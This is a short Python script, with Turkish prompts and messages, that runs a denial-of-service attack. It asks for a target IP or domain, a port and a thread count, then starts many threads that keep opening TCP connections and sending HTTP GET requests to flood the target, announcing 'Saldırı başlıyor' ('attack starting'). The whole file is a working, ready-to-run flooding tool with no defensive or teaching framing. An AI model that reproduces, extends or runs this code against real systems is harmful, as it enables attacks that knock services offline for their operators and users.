import socket
import threading
import random
import time

class DOSAttack:
    def __init__(self, target_ip, target_port, thread_count=100):
        self.target_ip = target_ip
        self.target_port = target_port
        self.thread_count = thread_count
        self.running = True

    def send_packets(self):
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                s.connect((self.target_ip, self.target_port))
                data = f"GET / HTTP/1.1\r\nHost: {self.target_ip}\r\n\r\n".encode('utf-8')
                s.send(data)
                s.close()
                print(f"[+] Paket gönderildi {self.target_ip}:{self.target_port}")
            except:
                pass

    def start_attack(self):
        print(f"\n[+] {self.target_ip}:{self.target_port} hedef alınıyor. Saldırı başlıyor...\n")
        threads = []
        for _ in range(self.thread_count):
            t = threading.Thread(target=self.send_packets)
            t.daemon = True
            t.start()
            threads.append(t)
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n[-] Saldırı durduruluyor...")
            self.running = False
            for t in threads:
                t.join()

def run():
    target = input("Hedef IP veya domain (örnek: 192.168.1.100): ").strip()
    port_input = input("Port numarası (örnek: 80): ").strip()
    threads_input = input("İş parçacığı (thread) sayısı (varsayılan: 100): ").strip()

    try:
        port = int(port_input)
        threads = int(threads_input) if threads_input else 100
    except ValueError:
        print("[!] Port ve thread sayısı sayı olmalıdır.")
        return

    dos = DOSAttack(target, port, threads)
    dos.start_attack()

if __name__ == "__main__":
    run()
